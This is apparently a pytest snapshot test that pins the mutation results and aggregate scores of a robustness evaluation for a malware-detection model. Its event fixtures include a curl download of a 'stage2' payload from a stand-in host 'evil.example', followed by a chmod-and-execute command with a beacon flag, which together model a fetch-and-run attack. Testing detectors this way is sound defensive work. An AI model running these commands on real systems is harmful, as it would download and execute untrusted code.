"""Snapshot of the full RobustnessCard a robustness evaluation produces.

Pins every mutation result (class, intensity, scores, escape flag and the LCG state after the
draw) for the synthetic-event path and for both tiers of the events-source path, so a
restructuring of `run_robustness_evaluation` cannot reorder the LCG draws (event, then
mutator, then intensity) or change what is scored without this test noticing. The model is a
fixed linear function of the features, so the scores are the same on every platform.
"""

from __future__ import annotations

from pathlib import Path

import numpy as np
import pytest
from helpers import write_jsonl

from synthaea_ml.evaluation.robustness import run_robustness_evaluation
from synthaea_ml.registry.records import RobustnessCard


class _LinearModel:
    """Scores a row as a fixed linear function of its first and last features."""

    n_features_in_ = 17

    def decision_function(self, rows: list[list[float]]) -> np.ndarray:
        return np.array([0.01 * row[0] - 0.5 + 0.05 * row[-1] for row in rows])


_SCENARIO = """name: snapshot_scenario
platform: linux
script: snapshot.sh
simulates: Snapshot scenario for robustness evaluation
expected_detections:
  - technique: "T1071"
    rule: c2
    min_count: 1
    tolerance: 0
  - technique: "T1059"
    rule: interpreter
    min_count: 1
    tolerance: 0
  - technique: "T1105"
    rule: transfer
    min_count: 1
    tolerance: 0
  - technique: "T1003"
    rule: other
    min_count: 1
    tolerance: 0
"""

_EVENTS = [
    {
        "type": "exec",
        "pid": 7,
        "ts_ns": 1_000_000_000,
        "argv": ["/usr/bin/curl", "-fsSL", "https://evil.example/stage2", "-o", "/tmp/s2"],
        "parent_comm": "bash",
        "parent_image_path": "/bin/bash",
    },
    {"type": "connect", "pid": 7, "ts_ns": 1_500_000_000, "daddr_v4": [203, 0, 113, 9], "dport": 443},
    {
        "type": "exec",
        "pid": 8,
        "ts_ns": 2_000_000_000,
        "argv": ["/bin/sh", "-c", "chmod +x /tmp/s2 && /tmp/s2 --beacon 30"],
    },
    {"type": "fileopen", "pid": 7, "ts_ns": 1_700_000_000, "path": "/tmp/s2", "flags": 0o101},
    {"argv": ["ls", "-la"]},
]


def current_cards(directory: Path) -> dict[str, RobustnessCard]:
    """The cards this snapshot pins, computed by the code under test."""
    scenario = directory / "snapshot_scenario.yaml"
    scenario.write_text(_SCENARIO, encoding="utf-8")
    events = write_jsonl(directory / "events.jsonl", _EVENTS)
    model = _LinearModel()
    return {
        "synthetic_t0": run_robustness_evaluation(
            model=model, scenario_yaml=scenario, tier="T0", mutation_seed=7
        ),
        "synthetic_t1": run_robustness_evaluation(
            model=model, scenario_yaml=scenario, tier="T1", mutation_seed=7
        ),
        "events_t0": run_robustness_evaluation(
            model=model, scenario_yaml=scenario, tier="T0", mutation_seed=11, threshold=-0.1, events_source=events
        ),
        "events_t1": run_robustness_evaluation(
            model=model, scenario_yaml=scenario, tier="T1", mutation_seed=11, events_source=events
        ),
    }


# (mutation_class, intensity, original_score, mutated_score, escaped, seed) per result,
# in the order the evaluation produced them before it was split into steps.
_EXPECTED_RESULTS: dict[str, list[tuple[str, str, float, float, bool, int]]] = {
    "synthetic_t0": [
        ("path_substitution", "light", -0.04999999999999999, -0.04999999999999999, False, 7),
        ("path_substitution", "medium", -0.04999999999999999, -0.04999999999999999, False, 7),
        ("path_substitution", "heavy", -0.04999999999999999, -0.04999999999999999, False, 7),
        ("argument_reorder", "light", -0.04999999999999999, -0.04999999999999999, False, 9098160460397411210),
        ("argument_reorder", "medium", -0.04999999999999999, -0.04999999999999999, False, 5031285092534963243),
        ("argument_reorder", "heavy", -0.04999999999999999, -0.04999999999999999, False, 7431924344364899904),
        ("path_substitution", "light", -0.15999999999999998, -0.15999999999999998, False, 7431924344364899904),
        ("path_substitution", "medium", -0.15999999999999998, -0.15999999999999998, False, 7431924344364899904),
        ("path_substitution", "heavy", -0.15999999999999998, -0.15999999999999998, False, 7431924344364899904),
        ("argument_reorder", "light", -0.15999999999999998, -0.15999999999999998, False, 5940934178883179151),
        ("argument_reorder", "medium", -0.15999999999999998, -0.15999999999999998, False, 18102185400360351090),
        ("argument_reorder", "heavy", -0.15999999999999998, -0.15999999999999998, False, 13090078374315816025),
        ("path_substitution", "light", -0.02999999999999997, 0.010000000000000009, True, 13090078374315816025),
        ("path_substitution", "medium", -0.02999999999999997, 0.010000000000000009, True, 13090078374315816025),
        ("path_substitution", "heavy", -0.02999999999999997, 0.010000000000000009, True, 13090078374315816025),
        ("argument_reorder", "light", -0.02999999999999997, -0.02999999999999997, False, 7757674689382620148),
        ("argument_reorder", "medium", -0.02999999999999997, -0.02999999999999997, False, 3577653062621741638),
        ("argument_reorder", "heavy", -0.02999999999999997, -0.02999999999999997, False, 4184551844443458792),
        ("path_substitution", "light", -0.32, -0.32, False, 4184551844443458792),
        ("path_substitution", "medium", -0.32, -0.32, False, 4184551844443458792),
        ("path_substitution", "heavy", -0.32, -0.32, False, 4184551844443458792),
        ("argument_reorder", "light", -0.32, -0.32, False, 1166418304621010455),
        ("argument_reorder", "medium", -0.32, -0.32, False, 16462037605738411098),
        ("argument_reorder", "heavy", -0.32, -0.32, False, 2892187164789250849),
    ],
    "synthetic_t1": [
        ("path_substitution", "light", -0.04999999999999999, -0.04999999999999999, False, 7),
        ("path_substitution", "medium", -0.04999999999999999, -0.04999999999999999, False, 7),
        ("path_substitution", "heavy", -0.04999999999999999, -0.04999999999999999, False, 7),
        ("argument_reorder", "light", -0.04999999999999999, -0.04999999999999999, False, 9098160460397411210),
        ("argument_reorder", "medium", -0.04999999999999999, -0.04999999999999999, False, 5031285092534963243),
        ("argument_reorder", "heavy", -0.04999999999999999, -0.04999999999999999, False, 7431924344364899904),
        ("path_substitution", "light", -0.15999999999999998, -0.15999999999999998, False, 7431924344364899904),
        ("path_substitution", "medium", -0.15999999999999998, -0.15999999999999998, False, 7431924344364899904),
        ("path_substitution", "heavy", -0.15999999999999998, -0.15999999999999998, False, 7431924344364899904),
        ("argument_reorder", "light", -0.15999999999999998, -0.15999999999999998, False, 5940934178883179151),
        ("argument_reorder", "medium", -0.15999999999999998, -0.15999999999999998, False, 18102185400360351090),
        ("argument_reorder", "heavy", -0.15999999999999998, -0.15999999999999998, False, 13090078374315816025),
        ("path_substitution", "light", -0.02999999999999997, 0.010000000000000009, True, 13090078374315816025),
        ("path_substitution", "medium", -0.02999999999999997, 0.010000000000000009, True, 13090078374315816025),
        ("path_substitution", "heavy", -0.02999999999999997, 0.010000000000000009, True, 13090078374315816025),
        ("argument_reorder", "light", -0.02999999999999997, -0.02999999999999997, False, 7757674689382620148),
        ("argument_reorder", "medium", -0.02999999999999997, -0.02999999999999997, False, 3577653062621741638),
        ("argument_reorder", "heavy", -0.02999999999999997, -0.02999999999999997, False, 4184551844443458792),
        ("path_substitution", "light", -0.32, -0.32, False, 4184551844443458792),
        ("path_substitution", "medium", -0.32, -0.32, False, 4184551844443458792),
        ("path_substitution", "heavy", -0.32, -0.32, False, 4184551844443458792),
        ("argument_reorder", "light", -0.32, -0.32, False, 1166418304621010455),
        ("argument_reorder", "medium", -0.32, -0.32, False, 16462037605738411098),
        ("argument_reorder", "heavy", -0.32, -0.32, False, 2892187164789250849),
    ],
    "events_t0": [
        ("path_substitution", "light", 0.08999999999999997, 0.13, False, 11),
        ("path_substitution", "medium", 0.08999999999999997, 0.17000000000000004, False, 11),
        ("path_substitution", "heavy", 0.08999999999999997, 0.17000000000000004, False, 11),
        ("argument_reorder", "light", 0.08999999999999997, 0.08999999999999997, False, 16107961282075031614),
        ("argument_reorder", "medium", 0.08999999999999997, 0.08999999999999997, False, 3677086500959208559),
        ("argument_reorder", "heavy", 0.08999999999999997, 0.08999999999999997, False, 5574338011599001428),
        ("path_substitution", "light", 0.010000000000000009, 0.050000000000000044, False, 5574338011599001428),
        ("path_substitution", "medium", 0.010000000000000009, 0.13, False, 5574338011599001428),
        ("path_substitution", "heavy", 0.010000000000000009, 0.13, False, 5574338011599001428),
        ("argument_reorder", "light", 0.010000000000000009, 0.010000000000000009, False, 2948126736590833427),
        ("argument_reorder", "medium", 0.010000000000000009, 0.010000000000000009, False, 7545671193672428710),
        ("argument_reorder", "heavy", 0.010000000000000009, 0.010000000000000009, False, 13227500810425447549),
        ("path_substitution", "light", -0.43, -0.43, False, 13227500810425447549),
        ("path_substitution", "medium", -0.43, -0.43, False, 13227500810425447549),
        ("path_substitution", "heavy", -0.43, -0.43, False, 13227500810425447549),
        ("argument_reorder", "light", -0.43, -0.43, False, 13227500810425447549),
        ("argument_reorder", "medium", -0.43, -0.43, False, 13227500810425447549),
        ("argument_reorder", "heavy", -0.43, -0.43, False, 13227500810425447549),
    ],
    "events_t1": [
        ("path_substitution", "light", 0.24, 0.28, False, 11),
        ("path_substitution", "medium", 0.24, 0.32000000000000006, False, 11),
        ("path_substitution", "heavy", 0.24, 0.32000000000000006, False, 11),
        ("argument_reorder", "light", 0.24, 0.24, False, 16107961282075031614),
        ("argument_reorder", "medium", 0.24, 0.24, False, 3677086500959208559),
        ("argument_reorder", "heavy", 0.24, 0.24, False, 5574338011599001428),
        ("path_substitution", "light", 0.06000000000000001, 0.10000000000000005, False, 5574338011599001428),
        ("path_substitution", "medium", 0.06000000000000001, 0.18, False, 5574338011599001428),
        ("path_substitution", "heavy", 0.06000000000000001, 0.18, False, 5574338011599001428),
        ("argument_reorder", "light", 0.06000000000000001, 0.06000000000000001, False, 2948126736590833427),
        ("argument_reorder", "medium", 0.06000000000000001, 0.06000000000000001, False, 7545671193672428710),
        ("argument_reorder", "heavy", 0.06000000000000001, 0.06000000000000001, False, 13227500810425447549),
        ("path_substitution", "light", -0.43, -0.43, False, 13227500810425447549),
        ("path_substitution", "medium", -0.43, -0.43, False, 13227500810425447549),
        ("path_substitution", "heavy", -0.43, -0.43, False, 13227500810425447549),
        ("argument_reorder", "light", -0.43, -0.43, False, 13227500810425447549),
        ("argument_reorder", "medium", -0.43, -0.43, False, 13227500810425447549),
        ("argument_reorder", "heavy", -0.43, -0.43, False, 13227500810425447549),
    ],
}

# (escape_rate, median_score_degradation, worst_case_degradation) per card.
_EXPECTED_AGGREGATES: dict[str, tuple[float, float, float]] = {
    "synthetic_t0": (0.125, 0.0, 0.03999999999999998),
    "synthetic_t1": (0.125, 0.0, 0.03999999999999998),
    "events_t0": (0.0, 0.0, 0.12),
    "events_t1": (0.0, 0.0, 0.11999999999999998),
}


@pytest.fixture(scope="module")
def cards(tmp_path_factory: pytest.TempPathFactory) -> dict[str, RobustnessCard]:
    return current_cards(tmp_path_factory.mktemp("robustness_snapshot"))


@pytest.mark.parametrize("case", sorted(_EXPECTED_RESULTS))
def test_mutation_results_match_the_snapshot(cards: dict[str, RobustnessCard], case: str) -> None:
    actual = [
        (r.mutation_class, r.intensity, r.original_score, r.mutated_score, r.escaped, r.seed)
        for r in cards[case].mutation_results
    ]
    assert actual == [
        (cls, intensity, pytest.approx(original), pytest.approx(mutated), escaped, seed)
        for cls, intensity, original, mutated, escaped, seed in _EXPECTED_RESULTS[case]
    ]


@pytest.mark.parametrize("case", sorted(_EXPECTED_RESULTS))
def test_score_delta_and_threshold_follow_the_scores(
    cards: dict[str, RobustnessCard], case: str
) -> None:
    threshold = -0.1 if case == "events_t0" else 0.0
    for result in cards[case].mutation_results:
        assert result.score_delta == result.mutated_score - result.original_score
        assert result.threshold == threshold


@pytest.mark.parametrize("case", sorted(_EXPECTED_AGGREGATES))
def test_card_aggregates_match_the_snapshot(cards: dict[str, RobustnessCard], case: str) -> None:
    card = cards[case]
    actual = (card.escape_rate, card.median_score_degradation, card.worst_case_degradation)
    assert actual == pytest.approx(_EXPECTED_AGGREGATES[case])
    assert card.scenario_name == "snapshot_scenario"
